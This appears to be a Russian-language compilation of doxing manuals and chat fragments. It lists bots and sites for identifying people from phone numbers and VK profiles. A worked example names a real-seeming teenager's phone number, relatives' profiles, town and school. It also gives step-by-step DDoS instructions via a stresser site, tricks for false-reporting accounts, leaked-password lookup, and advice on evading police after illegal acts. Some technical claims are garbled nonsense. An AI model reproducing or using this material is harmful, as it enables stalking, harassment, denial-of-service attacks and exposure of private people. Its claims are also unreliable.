Отзыв о продавце с известной доски объявлений,..
bases-brothers.ru
Как узнать ФИО зная номер телефона гражданина Росcии

1. Через приложение Сбербанк
[1] Откройте приложение Сбербанк на телефоне
[2] Отправьте любую сумму на номер телефона, если он привязан к аккаунту банка, то вы увидите ФИО получателя

2. Через VK Pay
[1] Зарегистрируйтесь в VK, или войдите в аккаунт
[2] Откройте vk.com/vkpay и пройдите верификацию если ее нет
[3] Баланс должен быть больше 1 рубля
[4] Нажмите на перевести, и выберите по номеру телефона
[5] В появившимся окне вверху будет имя и первая буква фамилии
@mailsearchbot
@whoisdombot
пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.
@bmi_np_bot
По номеру телефона определяет регион и оператора.
Интересно, что этот бот определяет даже новые номера и определяет номера, которые были перенесены совершенно недавно. Проверял. Удивило 😏
@getfb_bot
По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook. Функционал бесплатный.
@buzzim_alerts_bot
Поисковая система по платформе Telegram. Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт. Например, можно посмотреть какие каналы разнесли твои посты с Хабра, проверить ник юзера, где он еще трепался.
Функционал бесплатный.
@howtofind_bot
Робот разведчик. Подскажет секреты и приемы OSINT.
@smart_searchbot
Отличный бот, очень полный. Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.
@egrul_bot
Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда 🤐
Ограничений бота – нет.
https://pipl.com/
Тут ахуеть чего можно напробивать
он находит абсолютно всё
просто хуяришь номер или никнейм
там в строке
учу как скример запустить
Смотри
У чела должен быть торрент
там в торренте сверху пишет дохуя цифер
Если ты узнаешь эти цифры
У тебя есть полный доступ к его ПК
Заходишь в консоль
Пишешь
add host и эти цифры
если ты хочешь снести человека с которым был срач , тебе повезло! все свои сообщения с осками удаляешь , помечаешь сообщения того кого надо снести спамом и жалуешься за оскорбительное поведение , заходишь в тех поддержку и пишешь "здравствуйте , этот человек - vk.com/ оскорбляет моих родителей и меня , сообщения пометил спамом и пожаловался , рассмотрите пожалуйста мою жалобу.
ещё робит хуйня со сливом номера
тех поддержка https://vk.com/support?act=new&from=h&id=8842
ща
Али
Али
13.02.20
https://vk.com/app7183114?run_hash=6255a597a67c0a9cdc

VKInfo
Приложение
Открыть
Али
Али
02.04.20
Али
Али
02.04.20
1.
https://yadi.sk/d/sI6xDxjX9R1cYQ
https://yadi.sk/d/O1VBC2EmipOLSw
переменуй в rar.raо — Яндекс.Диск
yadi.sk
https://yadi.sk/d/Qz5VYBZ6eQihzA
InternetScammers Methods.rar — Яндекс.Диск..
yadi.sk
https://yadi.sk/d/u2WDHG_P9Yi6Aw

Аватарки YoungTerror — Яндекс.Диск
yadi.sk
https://yadi.sk/d/qdJPKO0CsCkNPA
UltraDeanonPack by DocDe — Яндекс.Диск
yadi.sk
Али
Али
16.04.20
yandex

intext

vkinfo

stresser

soxr kopiya

220vk.com

Скрытые друзья ВКонтакте в открытом доступе
220vk.com
Алексей
Алексей
16.04.20
https://vk.com/doc582340082_540320395?hash=e0ee0d3b94..
:04
http://vk.com/feed?obj=12053604&q=&section=me..

вместо цифр

ставим цифренное айди другого пользователя
https://vk.com/doc582340082_540320395?hash=e0ee0d3b94..
Али
Али
25.04.20
Deanonimizatsia_by_Derzhavin.txt
19 КБ
sposob_by_SlaneGrief.txt
9 КБ
Али
Али
25.04.20
@mailsearchbot
@whoisdombot
пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.
@bmi_np_bot
По номеру телефона определяет регион и оператора.
Интересно, что этот бот определяет даже новые номера и определяет номера, которые были перенесены совершенно недавно. Проверял. Удивило 😏
@getfb_bot
По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook. Функционал бесплатный.
@buzzim_alerts_bot
Поисковая система по платформе Telegram. Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт. Например, можно посмотреть какие каналы разнесли твои посты с Хабра, проверить ник юзера, где он еще трепался.
Функционал бесплатный.
@howtofind_bot
Робот разведчик. Подскажет секреты и приемы OSINT.
@smart_searchbot
Отличный бот, очень полный. Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.
@egrul_bot
Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда 🤐
Ограничений бота – нет.
все
Али
Али
29.04.20
оиск по физическому адресу любой страны
DeanonymizationAnal, не читай ато лох
DeanonymizationAnal, не читай ато лох 2 апр 2020 в 12:54
1. 3wifi — найдет wifi точки с паролями
2. kamerka (t) — найдет на карте камеры, устройства интернета вещей, принтеры, твитты, Instagram фото, Flickr и другие открытые устройства
3. wigle.net — покажет SSID и BSSID Wi-Fi точки
4. osintcombine.com — найдет Facebook страницы организаций
5. trendsmap.com — карта трендов в Twitter
6. omnisci.com — покажет твитты на карте
7. mattw.io — находит видео на YouTube
8. @suncalc_bot — расчет времени закатов, рассветов, сумерек
Open Source Intelligence | Australia | OSINT Combine
Open Source Intelligence | Australia | OSINT Combine
www.osintcombine.com

InfoApp
Приложение
Открыть
UltraDeanonPack by DocDe — Яндекс.Диск
yadi.sk
переменуй в rar.raо — Яндекс.Диск
yadi.sk
InternetScammers Methods.rar — Яндекс.Диск
yadi.sk

Check server: Check host - online website monitoring
check-host.net
для проверки ip
https://rusfinder.pro найдет инфу стр с 2016 года

Поиск людей по соцсетям RusFinder.pro
rusfinder.pro
1. @egrul_bot — найдет ИП и компании
2. yandex.people (http://yandex.ru/people) — поиск по социальным сетям
3. reestr-zalogov.ru — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д.
4. zytely.rosfirm.info (https://zytely.rosfirm.info/m/) — найдет адрес прописки и дату рождения, необходимо знать город
5. mmnt.ru — найдет упоминания в документах
6. kad.arbitr.ru — дела, рассматриваемые арбитражными судами
7. bankrot.fedresurs.ru — поиск по банкротам, можно узнать ИНН, СНИЛС и адрес
8. sudact.ru — судебные и нормативные акты РФ, поиск по участникам и судам
9. nomer.center — телефонный справочник, иногда нужен VPN
10. spra.vkaru.net — телефонный справочник по России, Украине, Белоруссии, Казахстану, Литве и Молдове
11. fssprus.ru (http://fssprus.ru/iss/ip/) — проверка задолженностей, для физ. лица
12. fio.stop-list.info — поиск по ИП и судам, если есть ИНН, то можно узнать больше
13. gcourts.ru — поиск решений судов общей юрисдикции
14. service.nalog.ru (https://service.nalog.ru/inn.do) — найдет ИНН, нужно знать полное ФИО, дату рождения и документ удостоверяющий личность
15. reestr-dover.ru (https://www.reestr-dover.ru/revocations) — поиск в списке сведений об отмене доверенности
16. судебныерешения.рф (http://судебныерешения.рф/)— найдет судебные решения, документы с ФИО датой и статьей
17. notariat.ru (https://data.notariat.ru/directory/succession/search?..) — поиск в реестре наследственных дел, найдет дату смерти человека и адрес нотариуса оформившее дело
18. @EyeGodBot — обратный поиск по GetContact, находит часть номера телефона
Адресный справочник городов России - Москва,..
jutel.rosfirm.info
Мамонт. Поисковая система. Поиск в Интернете!..
www.mmnt.ru
Дополнительный методы

1. Оставьте только цифры у номера телефона и добавьте к нему @yandex.ru а потом используйте методы для Яндекс почты - /yandex


Восстановление доступа

1. ICQ
(https://icq.com/password/ru)2. OK.ru
(https://ok.ru/password/recovery)3. Twitter
(https://twitter.com/account/begin_password_reset)4. VK.com
(https://vk.com/restore)5. Facebook
(https://www.facebook.com/login/identify?ctx=recover)6. Microsoft
(https://account.live.com/acsr)7. Instagram (https://www.instagram.com/accounts/password/reset/)
Сайт - http://quezstresser.com/
В первой строчке "Target IP" - пишем IP жертвы.
Во второй строчке "Target Port" - пишем 80.
В третей строчке "Time" - пишем 300. (300 = 5 минут).
В четвёртой строчке выбираем "NTP".
Максимальное время DDOS - 5 минут, тоесть 300 секунд. Больше ставить не получится.
Если будет какая либо ошибка , на подобие "15/15", пробуйте ещё раз и ещё раз, пока не получится.
вот как инет отключать

Привет! Ты купил обучение по деанонимизации (HARD) от Эли Криков//Панков//Глоков (@ljeminers). Благодарю за покупку 
данного мануала. За слив данного мануала можно понести наказание. Если ты хочешь быть и анонимным, можешь
приобрести у меня пак анонимности в ЛС.


Начнём с того, что самое главное качество, которым должен обладать любой деанонер, это Ум.


                               | ДЕАНОНИМИЗАЦИЯ ПО VK ПРОФИЛЮ |
Как бы это смешно ну звучало, но в основном для того, чтобы узнать профиль жертвы, стоит использовать приложение
от сообщества BAGOSI "InfoApp". Советуем проматривать вниматильно все коментарии, и просматривать посты/страницы
где жертва оставляла коментарии. Также лучшего всего просматривать упоминания жертвы (т.е посты, коментарии, где был упомянен профиль жертвы)
Ссылка - https://vk.com/feed?obj=IDЖертвыВЦифрах&section=mentions (Работает только с PC или же с браузера). Если страница жертвы довольно старая,
и открытая, либо же жертва у вас в друзьях, стоит проверить активность его профиля на 220vk.com. При известности города жертвы, вы сможете найти его одноклассников 
используя функцию 220вк "Города друзей", данная функция рассортирует всех друзей жертвы по городам. Также используя фунцию "Скрытые друзья" вы можете найти его родных/одноклассников/друзей из реальной жизни.
Для простого просмотра старых имён, вы можете вбить цифровой ID жертвы в Яндекс. 


 

                             | ИНФОРМАЦИЯ ПО ИГРОВОМУ НИКНЕЙМУ ЖЕРТВЫ | 
Имея ник жертвы, уже можно найти его информацию. Самый первый, хоть и старенький, но очень эффективный способ это вбить в Yandex "intext:nicnkname". 
Данный способ поможет найти все упоминания по интернету с данным ником. После чего, стоит зайти в группы где играла жертва, (аннализируем через коментарии и упоминания) и вбиваем этот ник в эти сообщества. 
Тем самым мы вероятно найдём основную страницу жертву, или же дальнейшую информацию. Также можно проверить информацию по базам серверов Minecraft PE, но данные базы можно приобрести в ЛС нашей группы.
Также вбиваем никнейм в YouTube, предварительно выбрав сортировку поиска "только каналы". 




                             | ПОИСК ИНФОРМАЦИИ ПО РЕАЛЬНОМУ Ф.И.О |
При известности такой информации о жертве стоит посеить каждую Соц. Сеть и проверить есть ли там такой "Иван Иванов" проживающий в "Москве".
Изначально советуем вам искать информацию в каждой соц сети по отдельному, не вбивая все попросту в Яндекс. Также можно проверить Ф.И.О в справочных 
сайтах города жертвы, в надежде найти адрес, а по нему и остальных родственников.




                               | ПОИСК ИНФОРМАЦИИ ПО ЮТУБ КАНАЛУ | 
Если вы вдруг нашли старый канал жертвы, но он полностью очищен, можно попробовать посмотреть его упоминания по его "НИКУ". 
"https://www.youtube.com/channel/UCrFiA0hztL9e8zTi_qBuW4w" после channel идет уникальный ID/Nick канала. Его вбиваем в VK и Yandex. Видим упоминания.
Также можно "откатить" канал вбив ник в Яндекс, и посмотреть сохраненый кэш. 








Остальные сервисы/сайты/боты которые могут в поиске информации на жертву:
1 - nuga.app (По номеру телефона 100% выдаст информацию жертвы).
2 - lampyre.io (Поиск по номеру, почте, гугл айди, и т.д) - Способ бесконечного пользования: 
Берём почту на https://temp-mail.org/ru/ и регистрируем аккаунт. При регистрации нам дадут 100 футонов, это 4 попытки. Советуем использовать VPN при смене аккаунта. 
3 - @PasswordSearchBot (Telegram бот. Выдаст пароли почты которые находяться в утечке).
4 - Глаз Бога (Telegram бот. Расширенные функции для поиска по Ф.И.О, номеру, почте, паролю, и многому другому).
5 - Боты в TG с базами серверов MCPE | VIMEWORLD:
@checkmcbot
@vimebasebot


void улутшыл деанон от флорала 
Делать деанон мы будем на примере этого номера - 79027054583

Узнать оператор и регион можно в глазе бога(eog.life) или на сайте https://www.kody.su/check-tel

 

Результат:

Номер - 79027054583

Оператор - теле2

Регион - Архангельская область
 

Дальше нужно найти вк. Сделать это можно следующим образом:

Добавляем номер в телефонную книгу Заходим в вк >> друзья >> добавить друга >> контакты. Ищем новый контакт в списке 
 
Если в списке не появился новый контакт:

Заходим в глаз бога (eog.life) и отправляем номер боту. В возможных именах будет его ФИ из вк. Добавляем номер в телефонную книгу, и в рекомендациях находим его вк по ФИ из глаза бога 

Результат:

Вк - https://vk.com/id606060972

 Как видим страница полностью анонимна, но это так кажется на первый взгляд.
 Для начало заходим на сайт https://yandex.ru/people, далее в поиск вписываем имя и день рождение, в нашем случае это (Никита, 27 июня). 
В поиске появляются множество людей с таким именем и датой рождения. 
Теперь мы имеем следующие данные: Никита, 27 июня, Архангельск.
Возвращаемся на сайт https://yandex.ru/people вводим в поиске Никита 27 июня, и ниже видим пункт "проживание"
 туда мы вставляем город Архангельск  и нажимаем поиск/enter. И мы видим 7 запросов и один из этих людей является наш https://vk.com/id606060972,
 в нашем случае это Никита.  
 
 Как найти родственников?

 Заходим в его список друзей и в поиске пишем его фамилию.


Результат:

Сестра - Алина Сухих, вк - https://vk.com/id654432323

Сестра - Алина Сухих, вк - https://vk.com/id627694790

Брат - Илья Сухих, вк - https://vk.com/id574897208

Мать - Альбина Сухих, вк - https://vk.com/id76855887

Отца в его списке друзей нет, ищем его в друзьях матери.
 

Результат:


Отец - Иван Сухих, вк - https://vk.com/id392218584


Узнать id и дату регистрации аккаунта можно в сервисе вк "InfoApp". Ссылка - https://vk.com/app7183114


Если аккаунт приватный, то можно посмотреть список друзей по ссылке - https://onli-vk.ru/pivatfriends.php?id=123 (После id= нужно поставить id аккаута)



Найти город очень легко. Он скорее всего указан в профиле у родственников, если нет, то смотрим его у друзей. В большинстве случаев был указан Северодвинск, значит это его город

 

 

 

Находим его фио. Фамилия и имя были указаны у него на странице, а отчество можно узнать по имени отца.

 

Результат:

Сухих Никита Иванович


Находим его школу. Чтобы найти её, смотрим у друзей в профиле место учёбы. У многих была указана МБОУ СОШ 22.

 

Дальше вводим город и номер школы на яндекс картах. Копируем её адрес, сайт и номер телефона.

 

Результат:

 

Возможная школа - МБОУ СОШ 22, по адресу ул. Карла Маркса, 33, Северодвинск, Архангельская обл., 1645121.

 

Сайт школы - http://29sev2x2.edusite.ru/


Hcrgram - новый юзербот который позволит вам деанонить людей не выходя из телеграма! В утилите также есть пробив по IP а также утилита, которая может снести полностью чат. 

Итак, первым делом скачиваем программу Termux:
!!!С PLAY MARKET НЕ БУДЕТ РАБОТАТЬ!!!

1: Скачиваем Termux с Fdroid:
https://f-droid.org/en/packages/com.termux/
Прямая ссылка на APK файл:
https://f-droid.org/repo/com.termux_118.apk
Или же с оффициального Github по ссылке:
https://github.com/termux/termux-app/releases/download/v0.118.0/termux-app_v0.118.0+github-debug_arm64-v8a.apk

2: Открываем Termux и обновляем пакеты:
🕸apt update -y && apt upgrade -y🕸
При обновлении пакетов у вас несколько раз будет зависать термукс и будет такое окно:
 
Чтобы продолжить работу просто нажимаете Enter. Окно будет появляться несколько раз.
3: Устанавливаем git
🕸pkg install git🕸

4: Устанавливаем юзербот
🕸git clone https://github.com/Hcrgram-Project/Hcrgram🕸

5: Переходим в папку и инициализируем установку
🕸cd Hcrgram && bash install.sh🕸
У вас появится вот такое окно, введите Y или нажмите Enter
6: Запуск
🕸python3 main.py🕸

МАНУАЛ ПО ДЕАНОНУ 
( НЕ СЛИВАТЬ)
Такие термины как Гб, Квик осинт будут объяснены во 2 сообщении.
сейчас я расскажу как деанонить по номеру,почте, нику, аккаунтам в соц сетях.
По номеру.
Для начала закидываем в @faseky94335648612_bot @Id1kosint_bot 
@usersbox_bot
@getcontact_real_bot
Они все требуют подписки, если они хоть что нибудь найдут то пишите в чат ниже, в конце мануала
Затем  номер @visionerobot сюда, если у вас нет подписки, то он всеравно покажет результат, нам важно увидеть какие аккаунты на номере есть.
Обычно у этого бота проблемы и он не показывает вк, поэтому кидаем сюда @InfoSearchRobot и тут, если в последнем сообщении не показывает вк ( там должна быть такая строка 👤 ВКонтакте: имя фамилия) если же ее нет, то вк на номере нет и деанон будет затруднителен. Допустим, у нас есть уже имя и фамилия челика, теперь мы должны найти страницу в вк @UniversalSearchRobot сюда закидываем номер и т.к. есть вк у нас будут такие строчки (
VK BY +79333117118

1. Account name
    Алексей Молодов

2. Find account
    👥People search
    🔑Password recovery) 
Мы нажимаем на password  recovery, проходим вводим капчу и фамилию челика, если же у него имя и фамилия стоит перевернуто (Бажин Егор) то пишем имя. Теперь мы получаем аву город и возраст, однако, если нет города и возраста, то мы сможем скорее всего найти его страницу. Теперь возвращаемся в бота и нажимаем people search, у нас откроется вк, в строчке поиска уже будет имя и фамилия. Теперь объясняю ( параметры - прочее- есть фотография это если есть ава, если же город, то параметры - регион- выбираете страну и вводите название населенного пункта) . Мы находим страницу челика, теперь добавим пример моего деанона https://vk.com/dalbaebb777, разберём сначало открытую страницу, затем закрытую .
@FindNameVk_bot кидаем ссылку сюда и получаем старые фи челика если он их изменял. Теперь закидываем сюда @InfoVkUser_bot , нажимаем город и получаем города его друзей. Затем заходим в его сообщества и ищем названия, где есть "школа" , либо название города, теперь сравниваем с тем что нашел бот и находим его город в нашем случае это деревня нелюдово. Теперь заходим в друзья и пишем его фамилию. Если там кто то есть, то нам повезло и это скорее всего родственники, заходим на их страницы и если они не закрытые, то кидаем в @InfoVkUser_bot и находим город , если он совпадает то это родственник, брат или отец вы, думаю, разберетесь по дате рождения. У нас мы находим старую страницу в ВК и родственников. 
Отец: https://vk.com/naessa05
Брат: https://vk.com/id629899458
Сестра: https://vk.com/zu_so2545 
Мать: https://vk.com/naessa05
Старый VK: https://vk.com/id665640881, так же закидываем их в бота @InfoVkUser_bot, проверяем сообщества ( если закрытые, то молитесь что это родственники) и если совпадает город, то это родственники. Папа или мама думаю разберетесь. так же заходим в их друзья и чекаем их фамилию, если они друг у друга в друзьях то это 100% Родственники. Теперь закидываем страницы челика и родственников закидываем в 
@usersbox_bot
@Id1kosint_bot
@faseky94335648612_bot
@The_NoNameBot
Они все требуют подписки, так что просите чекнуть в ботах в чатах в конце мануала, если они ничего не нашли, то не беспокойте чат! Теперь закидываем его ид в Яндекс! Т.к. мы закинули в Квик осинт, то нам покажет вечную ссылку.
В нашем случае  https://vk.com/id629887370
Кидаем в Яндекс id629887370 либо без id и ищем на каких нибудь форумах или Ютубе совпадение вам там покажет. если увидите что то по типу его фи, то это скорее всего просто характеристика страницы, такие сайты ничем не помогут.
Так же в Яндекс кидаем номер без + и ищем совпадения на сайтах.
 Теперь переходим к закрытой станице в вк.
Закидываем в Квик осинт и находим там вечную ссылку. https://onli-vk.ru/hide.php?id=549166890 заходим сюда и закидываем ссылку на сайте. Закидывать в нижнюю строку, после этого нажимаем назад к профилю и нажимаем на знаки вопроса, ( где внизу будет написано друзья.) Там находим друзей с открытыми страницами вк. Смотрим однофамильцев это будут родственниками, проводим с ними такие же процедуры.

Анонимность в интернете: Социальные сети и регистрация
26 августа 2022 от hellishkids.
Все мы сталкиваемя с регистрацией в социальных сетях, мессенджерах и обычных чатах, у нас у всех есть потребность к общению, именно поэтмоу я разберу основные правила регистрации в социальных сетях, а так-же расскажу о лидирующем чате в сфере анонимности.
Находясь в России, наша самая большая проблема - это анонимность в интернете. Первым делом что мы должны усвоить, так это то, что анонимность как таковая всё таки существует, добиться её не трудно и мы попробуем это сделать самыми доступными для примитивного Россиянина способами.

Первым этапом при регистрации в соц. сети нам необходимо усвоить то, что если мы пользуемся основным источником интернета, тобишь основным вайфаем или мобильным интернетом, то мы потенциально можем быть уязвимы благодаря системе СОРМ которая отслеживает каждое наше действие и хранится в базе оператора очень долгое время.
Для того, чтобы парализовать систему СОРМ и сделать себя неотслеживаемыми на 70% нам необходимо воспользоваться любым эффектным VPN сервисом с обфускацией трафика, хорошим методом для телефонов и компьютеров будет очень доступный и известный WireGuard, благодаря нему вы сможете обфусцировать свой трафик так, как пожелаете, а так-же даже на телефоне создавать огромную связку из данных VPN и максимально запутать систему СОРМ. Если мы хотим чтобы сервер к которому мы подключаемся не блокировал нас как юзера-спам, то мы используем proxy-сервер, именно он позволит замаскировать нас как рядового юзера окончательно, а если наш proxy-сервер является приватным и доступ к нему имеет ограниченное количество человек, то это еще лучше.
Рассмотрим регистрацию при помощи почты. Обычно популярные соц. сети и чаты имеют кастомный блокиратор СПАМ-почт, которые недоступны нам для регистрации, обычно именно такие почты и висят на всяких mail.tm и прочих temp-mail сервисах, но мы хитрее, будем вручную брать почту которая не очень известна в Россиийских мессенджерах и чатах, к примеру DNMX, SquirrelMail, Dizzum, с помощью данных почт с лёгкой регистрацией и хостингом в теневой сети TOR мы сможем получить максимально анонимную почту которую невозможно будет отследить.
DNMX Service Features
 В случае с номером телефона всё будет гораздо сложнее, использовать всякие onlinesim с раздачей российских номеров нам врядле получится, поэтому мы пребегнем к платным номерам телефонов, но брать мы их будем в теневых шопах с оплатой через криптокошелёк Monero и подобные ему, данные шопы очень легко ищутся через Torch или же DuckDuckGO коих много, самое главное отличить подделку от оригинала.
Использовать зарегистрированный аккаунт вне VPN и Proxy лучше не нужно, это сразу же скомпрометирует вас, и вы будете главной целью.
Лучше не работать в основных социальных сетях с данной связкой, это тоже равняется компрометации, так-как если гос. органы выйдут на вас, то вы сразу же окажетесь целью номер 1, и на вас легко найдут компромат.
Пример IRC-чата
Примером одного из них будет - anonops. В чате на данном сервере так-же имеется SSL защита и в него легко входить через консоль под проксификацей при помощи TOR, он имеет одноразовую регистрацию, самоуничтожающиеся комнаты которые сгорят со всеми переписками сразу-же после выхода всех участников из неё. Каждый пользователь автоматически удалятся после выхода из системы, база данных так-же очищается. На каждой комнате можно настроить систему паролей, добавить кастомных чат-ботов и еще куча интересных возможностей.
Анонимность в интернете: Строгие правила
26 августа 2022 от hellishkids.
В этом мануале по анонимности мы обсудим что запрещено делать для полной анонимности в интернете.

Заходить в собственные аккаунты через компрометированный VPN или Proxy
Данное строгое правило лучше соблюдать всегда, ведь при заходе на свой основной аккаунт ВКонтакте с прокси, на котором вы только что распространяли запрещённые в вашей стране материалы - это явно будет лишним. Полиция за пару дней достанет все ваши айпишники и сверит их с айпишником оставленным на месте преступления если вы вдруг попали под прицел.

Никогда не заходить в аккаунты которыми ты пользовался без TOR
То-же самое правило что и предыдущее но работающее наоборот. Нельзя входить в свой аккаунт которым ты пользовался при помощи TOR и общаясь наверняка совершал на нём незаконные действия, угрожал кому нибудь, или же сливал чьи-то данные.

НЕ ИСПОЛЬЗУЙТЕ НАХУЙ КИВИ И ПРОЧИЕ ПРОРОССИЙСКИЕ БАНКИ ЕСЛИ ВЫ ХОТИТЕ БЫТЬ АНОНИМНЫМ
Использование пророссийских банков приведёт к тому, что вы очень быстро будете набутылены, даже если вы уверены что вы - аноним. Лучше воспользуйтесь криптой, она куда безопаснее. Такие банки как QIWI собирают с вас максимальную информацию, любая посещенная вами страница собирает айпишник по 50 раз, всю вашу мету и еще дохуище подобной информации, даже сбербанк собирает меньше информации чем киви кошелёк.

Не отправляйте конфиденциальные данные без оконченного шифрования
Все ваши данные будут сразу-же перехвачены силовиками и системой СОРМ благодаря MITM-атаке на вашу сеть. Вся ваша сеть будет проанализирована силовиками, не думайте что ради вас они не будут заниматься такой хуетой, для них это - работа.
Я не требую от вас максимальной осторожности, но всё же быть внимательным лучше, чем быть потерянным в стрессовой ситуации. Не стоит включать впн и пользоваться им целый час без перепроверки в надежде на то, что он не отвалится спустя 5 минут использования, обычно для таких случаев в каждом впн встроена функция фаерволла, кратко - это блокировка интернета если он не подключен к впн.
Деанонимизация возможна не только с соединениями и IP-адресами, но также социальными способами. Вот некоторые рекомендации защиты от деанонимизации от Anonymous:
Не включайте в ники персональную информацию или личные интересы.
Не обсуждайте персональную информацию, такую как место жительства, возраст, семейный статус и т. д. Со временем глупые беседы вроде обсуждения погоды могут привести к точному вычислению местоположения пользователя.
Не публикуйте информацию в обычном Интернете (Clearnet), будучи анонимным.
Не публикуйте ссылки на изображения Facebook. В имени файла содержится ваш персональный ID.
Не заходите на один сайт в одно и то же время дня или ночи. Пытайтесь варьировать время сеансов.
Не обсуждайте ничего личного вообще, даже при защищённом и анонимном подключении к группе незнакомцев. Получатели в группе представляют собой потенциальный риск («известные неизвестные») и их могут заставить работать против пользователя. Нужен всего один информатор, чтобы развалить группу.
Герои существуют только в комиксах — и на них активно охотятся. Есть только молодые или мёртвые герои.
Если необходимо раскрыть какие-то идентификационные данные, то расценивайте их как конфиденциальную информацию, описанную в предыдущем разделе.
Чем дольше используется один и тот же псевдоним, тем выше вероятность ошибки, которая выдаст личность пользователя. Как только это произошло, противник может изучить историю и всю активность под этим псевдонимом. Предусмотрительно будет регулярно создавать новые цифровые личности и прекращать использовать старые.
Крч я тут типо рассказываю, да
Если вы видите этот мануал, то вас уже отъебали и вы не знаете че с этим делать. (шучу)

Anonymous 
Советую удалить все почты нахуй.
Лан шучу, юзай tutanota и будь спокоен. (quick osint её юзает кста)
Если не хотите удалять почты, то как хотите, инфу уже на вас насосали.
Кнш можно отключить всю слежку в гмайл, но он все равно дает больше чем нужно.

Порой я в ахуи, люди говорят что телеграм анонимный, хотя там чаты ебучим сканом можно чекать ,даже приват.
Юзай matrix element норм мессенджер, приватный, с cve правда, но там только со стороны учетки расшифровать можно.

Еще люди думают что по peer to peer, можно кого то вычислить.
Уже фиксануто все фиксики пофиксили. (Но в телеге и вайбере оно есть, можно отключить)
Но вы все равно можете юзать прокси, чтобы js инфу не кляпали (хотя их можно отключить :/)

По поводу ботов в телеге, можете давать инфу, которую они сами показывают долбаебы. (чтобы ее скрыть)
Можете дать им все. Почему?
Потому что все в открытом доступе, когда происходит утечка, данные можно обрабатывать.
Такой хуйней и пользуются боты и сайты.
А бот insight немного ахуел, врятле от него можно скрыть чет (еще один повод съебатся с телеги)
(А еще они сурсы отказались продавать, гандоны)
Подобный парсер изи написать, но бд лень добавлять (а их дохуище)

Ух, а что же делать, если тебя пытаются сватнуть?
Там есть в настройках ксяоми (на других не чекал), можно отключить маршрутизатор в экстренных случаях. (Чтобы вас машина сбила, а вы адресс сказать не можете) (лучше отрубите всю слежку)
Просто блокните исходящие ответы кроме ip телефонии, а потом юзайте войпы
Впринципе hlr запрос создают за тем, чтобы узнать номер инакив или актив, чтобы потом спокойно фрикать.
 - Методика проста - Оффаете фулл исходники , и все :)
Есть кнш хуйня с openvpn в роутере, но не думаю что вы такие умные) (но это фрикинг)
Есть просто дебилизм - звонят в мвд через скайп или пишут на почту
Хотя я не понимаю как там вообще инфу фильтруют, если такая хуйня канает

В Соц.сетях поставьте максимально конфидециальные настройки и не распространяйте личную инфу, наоборот пытайтесь запутать вектора атаки (ну тут уже для норм людей)
Хотя есть такие примочки как ipp для вк, которому похуй на настройки профиля и он чекает даже удаленки (но это уже совсем другая история)

Как же скрыть свои платёжные реквизиты? 
Ну ты долба... Крч создаешь payeer на вирт номер, потом чел туда кидает бабки, а ты потом выводишь на основу с коммисией (она там маленькая) profit!

Какую OS использовать для хацкерских делишек? С обочкой Tor к примеру тот самый Tails 
Для пентеста советую Кальку
----- dnn bot sites
И такс
Quick Osint (ЖРУТ ЗА СУРСЫ КАК ЗА ПОЧКУ НАХУЙ) - юзают гос сервисы (все в опенсурс на лолзе) чекают утечки т.д
Гб - старичок но уже с обширной бдшкой
utechka.com - (я с этой хуйней прикольнулся, скинул их айпишник тачки в беседу) - появился недавно , парсит по бд
есть еще universal и подобные (тоже в опенсурсе на лолзе)
-----

Так а че у нас по мете?
EXIF , XMP , IPTC 
То что чаще приходится стирать с фоток (по придумывали хуйни, теперь страдаем)
Загуглите сами, полезно будет :)

-----
Кнш я тут не все описал, есть еще много фишек, но их дохуя и мне лень писать.
Сука не давайте эту хуйню стэндофферам, они отбитые нахуй
Вообще думаю это первый и последний мануал, т.к не хочу расскрывать свои фишки, проще паспорта продавать

Это дефолт методики как по мне :)


Как узнать номер телефона по виртуальной QIWI карте. Проще простого.!
4 мая 2021
У компании QIWI есть дочерняя платежная система CONTACT.

 Но главное здесь — в отчете об успешном переводе указывается телефон владельца карты. Этим  мы и воспользуемся. 
└ (Данный метод действителен только с Qiwi)

И так: Что нам нужно.

1.) ┏ Номер виртуальной Qiwi карты.
2.) ┠ Верифицированный аккаунт CONTACT.
3.) ┗ Любая карта для списания 1₽.

Создаем аккаунт CONTACT:
1️.) Скачиваем в play маркет приложение  CONTACT 

 2️. ) Переходим на форму регистрации.
 4️.) Заполняем профиль, вбиваем паспортные данные.
 └ Где вы их возьмёт, это уже ваша задача.

Узнаем номер телефона хулигана.

1️.) Переходим на страницу перевода.
2️.) Указываем номер виртуальной карты хулигана.(фио можно любое)
3️.) Переводим 1₽.
На этом фото, данные мои!
На этом всё 🤷‍♂️
Спасибо за внимание, надеюсь вам будет полезно. 🤝
Крч я тут типо рассказываю, да
Если вы видите этот мануал, то вас уже отъебали и вы не знаете че с этим делать. (шучу)

Anonymous 
Советую удалить все почты нахуй.
Лан шучу, юзай tutanota и будь спокоен. (quick osint её юзает кста)
Если не хотите удалять почты, то как хотите, инфу уже на вас насосали.
Кнш можно отключить всю слежку в гмайл, но он все равно дает больше чем нужно.

Порой я в ахуи, люди говорят что телеграм анонимный, хотя там чаты ебучим сканом можно чекать ,даже приват.
Юзай matrix element норм мессенджер, приватный, с cve правда, но там только со стороны учетки расшифровать можно.

Еще люди думают что по peer to peer, можно кого то вычислить.
Уже фиксануто все фиксики пофиксили. (Но в телеге и вайбере оно есть, можно отключить)
Но вы все равно можете юзать прокси, чтобы js инфу не кляпали (хотя их можно отключить :/)

По поводу ботов в телеге, можете давать инфу, которую они сами показывают долбаебы. (чтобы ее скрыть)
Можете дать им все. Почему?
Потому что все в открытом доступе, когда происходит утечка, данные можно обрабатывать.
Такой хуйней и пользуются боты и сайты.
А бот insight немного ахуел, врятле от него можно скрыть чет (еще один повод съебатся с телеги)
